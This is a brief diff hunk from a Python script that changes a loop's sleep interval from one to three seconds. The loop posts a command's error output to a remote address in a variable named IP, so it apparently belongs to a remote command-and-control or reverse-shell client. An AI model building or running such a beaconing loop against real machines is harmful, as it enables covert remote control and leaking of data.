@@ -35,4 +35,4 @@ while True:
         post_response = requests.post(
             url=IP, data=CMD.stderr.decode())
     print(f"Status Code: {req.status_code}")
-    time.sleep(1)
+    time.sleep(3)
